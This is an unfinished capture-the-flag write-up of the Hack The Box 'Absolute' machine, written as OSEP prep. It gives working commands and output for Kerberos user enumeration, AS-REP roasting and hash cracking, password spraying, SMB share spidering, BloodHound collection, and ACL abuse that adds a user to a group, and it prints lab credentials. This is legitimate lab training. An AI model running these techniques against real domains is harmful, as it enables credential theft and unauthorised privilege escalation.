---
title: "OSEP Prep - HTB Absolute"
date: 2025-11-1
author: headlessmonster
categories: [HTB, OSEP]
---


Hello everyone,
I have not completely solved the machine yet. I’m investing small amounts of time to upskill and gradually working toward my goal of self-improvement.

### Nmap
Running Default nmap scan with services and default safe script.
Current thought Process/Attack Path  and Infomration 
1. Domain Name :- `absolute.htb` `dc.absolute.htb`

2. Port 445 
	1. Check for null session
3. Port 389
	1. 1. Check for anonymous ldap
	2. If Connected get Username/Sameaccount for ASP-Roast
		1. ASPRoast is basciall like keberoasting wit domain credentials and Pre-Auth need to be enable for tat user/service
	3. Check any hardcoded credentials in description feilds
4. Port 5985
	1. PSRemottin inase of valid creds we can use evil-winrm\
5. Port 80
	1. Web App attack for gainin RCE
	2. Finding leakage or username from contact 

```bash
nmap -sV -sC 10.129.232.60
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 01:38 EDT
Nmap scan report for 10.129.232.60
Host is up (0.21s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Absolute
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-01 12:38:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-01T12:39:19+00:00; +6h59m54s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.absolute.htb, DNS:absolute.htb, DNS:absolute
| Not valid before: 2025-04-23T18:13:50
|_Not valid after:  2026-04-23T18:13:50
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.absolute.htb, DNS:absolute.htb, DNS:absolute
| Not valid before: 2025-04-23T18:13:50
|_Not valid after:  2026-04-23T18:13:50
|_ssl-date: 2025-11-01T12:39:20+00:00; +6h59m53s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-01T12:39:19+00:00; +6h59m54s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.absolute.htb, DNS:absolute.htb, DNS:absolute
| Not valid before: 2025-04-23T18:13:50
|_Not valid after:  2026-04-23T18:13:50
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.absolute.htb, DNS:absolute.htb, DNS:absolute
| Not valid before: 2025-04-23T18:13:50
|_Not valid after:  2026-04-23T18:13:50
|_ssl-date: 2025-11-01T12:39:20+00:00; +6h59m53s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m53s, deviation: 0s, median: 6h59m53s
| smb2-time: 
|   date: 2025-11-01T12:39:12
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.09 seconds

```

### Port 80
Web App not look that interesting apart form some images and a link to 3rd party domain. 
Let's download each images to looks for any meta data in the image that can be helpful
![Web App Absolute](/assets/img/Absolute/web_app_absolute.png)


Reference `[How do I use Wget to download all images into a single folder, from a URL? - Stack Overflow](https://stackoverflow.com/questions/4602153/how-do-i-use-wget-to-download-all-images-into-a-single-folder-from-a-url)`

```bash
wget -nd -r -P . -A jpeg,jpg,bmp,gif,png http://absolute.htb/
--2025-11-01 01:53:35--  http://absolute.htb/
Resolving absolute.htb (absolute.htb)... 10.129.232.60
Connecting to absolute.htb (absolute.htb)|10.129.232.60|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2909 (2.8K) [text/html]
Saving to: ‘./index.html.tmp’

index.html.tmp                               100%[=============================================================================================>]   2.84K  --.-KB/s    in 0s      

2025-11-01 01:53:35 (661 MB/s) - ‘./index.html.tmp’ saved [2909/2909]

Loading robots.txt; please ignore errors.
--2025-11-01 01:53:35--  http://absolute.htb/robots.txt
Reusing existing connection to absolute.htb:80.
HTTP request sent, awaiting response... 404 Not Found
2025-11-01 01:53:35 ERROR 404: Not Found.

Removing ./index.html.tmp since it should be rejected.

--2025-11-01 01:53:35--  http://absolute.htb/images/hero_1.jpg
Reusing existing connection to absolute.htb:80.
HTTP request sent, awaiting response... 200 OK
Length: 407495 (398K) [image/jpeg]
Saving to: ‘./hero_1.jpg’

hero_1.jpg                                   100%[=============================================================================================>] 397.94K   111KB/s    in 3.6s    

2025-11-01 01:53:39 (111 KB/s) - ‘./hero_1.jpg’ saved [407495/407495]

--2025-11-01 01:53:39--  http://absolute.htb/images/hero_2.jpg
Reusing existing connection to absolute.htb:80.

```

### Username From metadata
```bash
exiftool * | grep Author
Author                          : James Roberts
Author                          : Michael Chaffrey
Author                          : Donald Klay
Author                          : Sarah Osvald
Author                          : Jeffer Robinson
Author                          : Nicole Smith

──(kali㉿kali)-[~/Desktop/OSEP_PREP/Absolute_01_11_2025/images]
└─$ exiftool * | grep Author | cut -d ":" -f 2
 James Roberts
 Michael Chaffrey
 Donald Klay
 Sarah Osvald
 Jeffer Robinson
 Nicole Smith
                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/OSEP_PREP/Absolute_01_11_2025/images]
└─$ exiftool * | grep Author | cut -d ":" -f 2 | sed 's/^ //'               
James Roberts
Michael Chaffrey
Donald Klay
Sarah Osvald
Jeffer Robinson
Nicole Smith
                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/OSEP_PREP/Absolute_01_11_2025/images]
└─$ exiftool * | grep Author | cut -d ":" -f 2 | sed 's/^ //' > username.txt
```

Now create a different username format using `[urbanadventurer/username-anarchy: Username tools for penetration testing](https://github.com/urbanadventurer/username-anarchy)`

```bash
./username-anarchy -i /home/kali/Desktop/OSEP_PREP/Absolute_01_11_2025/username.txt 
james
jamesroberts
james.roberts
jamesrob
jamerobe
jamesr
j.roberts
jroberts
rjames
r.james
robertsj
roberts
roberts.j
roberts.james
....
```

Now we can use kerbrute to identify valid user using kerbrose and send TFT with no pre-authentication. If KDC prompts for pre-authentication we know the username exists

```bash
./kerbrute_linux_amd64 userenum  --dc dc.absolute.htb -d absolute.htb /home/kali/Desktop/OSEP_PREP/Absolute_01_11_2025/users/usernameFormat

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/01/25 - Ronnie Flathers @ropnop

2025/11/01 02:08:35 >  Using KDC(s):
2025/11/01 02:08:35 >   dc.absolute.htb:88

2025/11/01 02:08:36 >  [+] VALID USERNAME:       j.roberts@absolute.htb
2025/11/01 02:08:36 >  [+] VALID USERNAME:       m.chaffrey@absolute.htb
2025/11/01 02:08:37 >  [+] VALID USERNAME:       s.osvald@absolute.htb
2025/11/01 02:08:37 >  [+] VALID USERNAME:       j.robinson@absolute.htb
2025/11/01 02:08:38 >  [+] VALID USERNAME:       d.klay@absolute.htb
2025/11/01 02:08:38 >  [+] VALID USERNAME:       n.smith@absolute.htb
2025/11/01 02:08:38 >  Done! Tested 88 usernames (6 valid) in 2.643 seconds

```

Let's Perform asproasting on the valid user 

```bash
┌──(kali㉿kali)-[~/Desktop/OSEP_PREP/Absolute_01_11_2025/users]
└─$ nxc ldap absolute.htb -u valid_username -p ''  --asreproast output.txt
LDAP        10.129.232.60   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:absolute.htb)
LDAP        10.129.232.60   389    DC               $krb5asrep$23$d.klay@ABSOLUTE.HTB:2da236b217578d549215866840ad5674$19fe4f465ea5d8fae3560251f4a7446885523312080c2e06d47e0fc71983b30535828b80624c4f277e9cbae5ef03864c7e6e44745d0f3e40dbe9df8edc299d048a4ba9fa1be841ec902789c70a725bdbfdc6813129dd1f654af8b6967dc2587625b53552e04144f5d1547caac6cddc108d2031ce44672ed417e819b8fbcbe2952f321f88c4ff3189c8480d0f62604faa43a82114b7b771540d1a1affa33dc67d6b64f74d645059a8fba017ca21a721d6fdb74a0ad546082e6264ea74625beffc6c7ed36187103c21794a5d65bf80da6f3255c279313b8a632c4ca91d7e1ce522168d639ea8eff5986c687a0b 
```

### Password Crack

```bash
└─$ hashcat -m18200 output.txt /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 9 7950X3D 16-Core Processor, 1467/2934 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
...
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5asrep$23$d.klay@ABSOLUTE.HTB:2da236b217578d549215866840ad5674$19fe4f465ea5d8fae3560251f4a7446885523312080c2e06d47e0fc71983b30535828b80624c4f277e9cbae5ef03864c7e6e44745d0f3e40dbe9df8edc299d048a4ba9fa1be841ec902789c70a725bdbfdc6813129dd1f654af8b6967dc2587625b53552e04144f5d1547caac6cddc108d2031ce44672ed417e819b8fbcbe2952f321f88c4ff3189c8480d0f62604faa43a82114b7b771540d1a1affa33dc67d6b64f74d645059a8fba017ca21a721d6fdb74a0ad546082e6264ea74625beffc6c7ed36187103c21794a5d65bf80da6f3255c279313b8a632c4ca91d7e1ce522168d639ea8eff5986c687a0b:Darkmoonsky248girl

d.klay:Darkmoonsky248girl
```

### STATUS_ACCOUNT_RESTRICTION 

Mostly mean ntlm is disable but we can use Kerberos 

```bash
┌──(kali㉿kali)-[~/Desktop/OSEP_PREP/Absolute_01_11_2025/users]
└─$ nxc smb absolute.htb -u d.klay -p Darkmoonsky248girl
SMB         10.129.232.60   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False) 
SMB         10.129.232.60   445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/OSEP_PREP/Absolute_01_11_2025/users]
└─$ nxc smb absolute.htb -u valid_username -p Darkmoonsky248girl --continue-on-success
SMB         10.129.232.60   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False) 
SMB         10.129.232.60   445    DC               [-] absolute.htb\j.roberts:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.232.60   445    DC               [-] absolute.htb\m.chaffrey:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.232.60   445    DC               [-] absolute.htb\s.osvald:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.232.60   445    DC               [-] absolute.htb\j.robinson:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.232.60   445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.232.60   445    DC               [-] absolute.htb\n.smith:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
```


```bash
sudo timedatectl set-ntp 0
sudo ntpdate 10.129.232.60 

LDAP        absolute.htb    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:absolute.htb)
LDAP        absolute.htb    389    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl
```

### Listing Shares

```bash
──(kali㉿kali)-[~/Desktop/OSEP_PREP/Absolute_01_11_2025/users]
└─$ nxc ldap absolute.htb -u d.klay -p Darkmoonsky248girl -k --users
LDAP        absolute.htb    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:absolute.htb)
LDAP        absolute.htb    389    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
LDAP        absolute.htb    389    DC               [*] Enumerated 17 domain users: absolute.htb
LDAP        absolute.htb    389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        absolute.htb    389    DC               Administrator                 2022-06-09 04:25:57 0        Built-in account for administering the computer/domain      
LDAP        absolute.htb    389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        absolute.htb    389    DC               krbtgt                        2022-06-09 04:16:38 0        Key Distribution Center Service Account                     
LDAP        absolute.htb    389    DC               J.Roberts                     2022-06-09 04:25:51 0                                                                    
LDAP        absolute.htb    389    DC               M.Chaffrey                    2022-06-09 04:25:51 0                                                                    
LDAP        absolute.htb    389    DC               D.Klay                        2022-06-09 04:25:51 0                                                                    
LDAP        absolute.htb    389    DC               s.osvald                      2022-06-09 04:25:51 0                                                                    
LDAP        absolute.htb    389    DC               j.robinson                    2022-06-09 04:25:51 0                                                                    
LDAP        absolute.htb    389    DC               n.smith                       2022-06-09 04:25:51 0                                                                    
LDAP        absolute.htb    389    DC               m.lovegod                     2022-06-09 04:25:51 0                                                                    
LDAP        absolute.htb    389    DC               l.moore                       2022-06-09 04:25:51 0                                                                    
LDAP        absolute.htb    389    DC               c.colt                        2022-06-09 04:25:51 0                                                                    
LDAP        absolute.htb    389    DC               s.johnson                     2022-06-09 04:25:51 0                                                                    
LDAP        absolute.htb    389    DC               d.lemm                        2022-06-09 04:25:51 0                                                                    
LDAP        absolute.htb    389    DC               svc_smb                       2022-06-09 04:25:51 0        AbsoluteSMBService123!                                      
LDAP        absolute.htb    389    DC               svc_audit                     2022-06-09 04:25:51 0                                                                    
LDAP        absolute.htb    389    DC               winrm_user                    2022-06-09 04:25:51 2        Used to perform simple network tasks     
```

We have a password `AbsoluteSMBService123!` we can also use the same password for all user to check if any user have used the same password or not

```bash
nxc ldap absolute.htb -u d.klay -p Darkmoonsky248girl -k --users | awk '{print $5}'
[*]
[+]
[*]
-Username-
Administrator
Guest
krbtgt
J.Roberts
M.Chaffrey
D.Klay
s.osvald
j.robinson
n.smith
m.lovegod
l.moore
c.colt
s.johnson
d.lemm
svc_smb
svc_audit
winrm_user
```

```bash
nxc ldap absolute.htb -u valid_username -p 'AbsoluteSMBService123!' -k --continue-on-success 
LDAP        absolute.htb    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:absolute.htb)
LDAP        absolute.htb    389    DC               [-] absolute.htb\j.roberts:AbsoluteSMBService123! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\m.chaffrey:AbsoluteSMBService123! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\s.osvald:AbsoluteSMBService123! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\j.robinson:AbsoluteSMBService123! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [+] absolute.htb\d.klay account vulnerable to asreproast attack 
LDAP        absolute.htb    389    DC               [-] absolute.htb\n.smith:AbsoluteSMBService123! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\J.Roberts:AbsoluteSMBService123! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\M.Chaffrey:AbsoluteSMBService123! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [+] absolute.htb\D.Klay account vulnerable to asreproast attack 
LDAP        absolute.htb    389    DC               [-] absolute.htb\s.osvald:AbsoluteSMBService123! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\j.robinson:AbsoluteSMBService123! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\n.smith:AbsoluteSMBService123! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\m.lovegod:AbsoluteSMBService123! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\l.moore:AbsoluteSMBService123! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\c.colt:AbsoluteSMBService123! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\s.johnson:AbsoluteSMBService123! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\d.lemm:AbsoluteSMBService123! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123! 
LDAP        absolute.htb    389    DC               [-] absolute.htb\svc_audit:AbsoluteSMBService123! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\winrm_user:AbsoluteSMBService123! KDC_ERR_PREAUTH_FAILED
```

### Enumerate Shares

```bash
nxc smb absolute.htb -u svc_smb -p 'AbsoluteSMBService123!' -k --shares -M spider_plus
SMB         absolute.htb    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False) 
SMB         absolute.htb    445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123! 
SPIDER_PLUS absolute.htb    445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS absolute.htb    445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS absolute.htb    445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS absolute.htb    445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS absolute.htb    445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS absolute.htb    445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS absolute.htb    445    DC               [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         absolute.htb    445    DC               [*] Enumerated shares
SMB         absolute.htb    445    DC               Share           Permissions     Remark
SMB         absolute.htb    445    DC               -----           -----------     ------
SMB         absolute.htb    445    DC               ADMIN$                          Remote Admin
SMB         absolute.htb    445    DC               C$                              Default share
SMB         absolute.htb    445    DC               IPC$            READ            Remote IPC
SMB         absolute.htb    445    DC               NETLOGON        READ            Logon server share 
SMB         absolute.htb    445    DC               Shared          READ            
SMB         absolute.htb    445    DC               SYSVOL          READ            Logon server share 
SPIDER_PLUS absolute.htb    445    DC               [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/absolute.htb.json".
SPIDER_PLUS absolute.htb    445    DC               [*] SMB Shares:           6 (ADMIN$, C$, IPC$, NETLOGON, Shared, SYSVOL)
SPIDER_PLUS absolute.htb    445    DC               [*] SMB Readable Shares:  4 (IPC$, NETLOGON, Shared, SYSVOL)
SPIDER_PLUS absolute.htb    445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS absolute.htb    445    DC               [*] Total folders found:  16
SPIDER_PLUS absolute.htb    445    DC               [*] Total files found:    7
SPIDER_PLUS absolute.htb    445    DC               [*] File size average:    10.57 KB
SPIDER_PLUS absolute.htb    445    DC               [*] File size min:        22 B
SPIDER_PLUS absolute.htb    445    DC               [*] File size max:        66 KB

```

```bash
 "compiler.sh": {
            "atime_epoch": "2022-06-09 04:30:03",
            "ctime_epoch": "2022-06-08 09:20:32",
            "mtime_epoch": "2022-09-01 13:02:23",
            "size": "72 B"
        },
        "test.exe": {
            "atime_epoch": "2022-06-09 04:30:03",
            "ctime_epoch": "2022-06-08 00:13:07",
            "mtime_epoch": "2022-09-01 13:02:23",
            "size": "66 KB"
        }
```

We can download the test.exe using smbclient and then connect our VPN into our windows machine run the exe and from Wireshark and get the ldap creds. `AbsoluteLDAP2022!`

```bash
nxc ldap absolute.htb -u valid_username -p 'AbsoluteLDAP2022!' -k --continue-on-success
LDAP        absolute.htb    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:absolute.htb)
LDAP        absolute.htb    389    DC               [-] absolute.htb\j.roberts:AbsoluteLDAP2022! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\m.chaffrey:AbsoluteLDAP2022! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\s.osvald:AbsoluteLDAP2022! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\j.robinson:AbsoluteLDAP2022! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [+] absolute.htb\d.klay account vulnerable to asreproast attack 
LDAP        absolute.htb    389    DC               [-] absolute.htb\n.smith:AbsoluteLDAP2022! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\J.Roberts:AbsoluteLDAP2022! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\M.Chaffrey:AbsoluteLDAP2022! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [+] absolute.htb\D.Klay account vulnerable to asreproast attack 
LDAP        absolute.htb    389    DC               [-] absolute.htb\s.osvald:AbsoluteLDAP2022! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\j.robinson:AbsoluteLDAP2022! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [-] absolute.htb\n.smith:AbsoluteLDAP2022! KDC_ERR_PREAUTH_FAILED
LDAP        absolute.htb    389    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022! 
```

```bash
nxc ldap 10.129.232.60 -u m.lovegod -p 'AbsoluteLDAP2022!' -k --bloodhound -c all                        
LDAP        10.129.232.60   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:absolute.htb)
LDAP        10.129.232.60   389    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022! 
LDAP        10.129.232.60   389    DC               Resolved collection methods: psremote, acl, objectprops, session, group, localadmin, dcom, container, trusts, rdp
LDAP        10.129.232.60   389    DC               Using kerberos auth without ccache, getting TGT
LDAP        10.129.232.60   389    DC               Done in 00M 36S
LDAP        10.129.232.60   389    DC               Compressing output into /home/kali/.nxc/logs/DC_10.129.232.60_2025-11-01_100559_bloodhound.zip

```

We have writeowner access on network audit group 
![Writeowner](/assets/img/Absolute/Writeowner.png)

Network Audit have Generic write on winrm_user
![Winrm](/assets/img/Absolute/genericwrite.png)

### Adding to group

```bash
net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```

```bash
net rpc group addmem "NETWORK AUDIT" "m.lovegod" -U "absolute.htb"/"m.lovegod"%"AbsoluteLDAP2022!" -S "absolute.htb"
```

```bash
impacket-dacledit -k 'absolute.htb/m.lovegod:AbsoluteLDAP2022!' -dc-ip dc.absolute.htb -principal m.lovegod -target "Network Audit" -action write -rights WriteMembers
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] DACL backed up to dacledit-20251101-123759.bak
[*] DACL modified successfully!
```

```bash
bloodyad -H dc.absolute.htb -d absolute.htb -u m.lovegod -p 'AbsoluteLDAP2022!' -k add groupMember "NETWORK AUDIT" "m.lovegod"                                        
[+] m.lovegod added to NETWORK AUDIT

```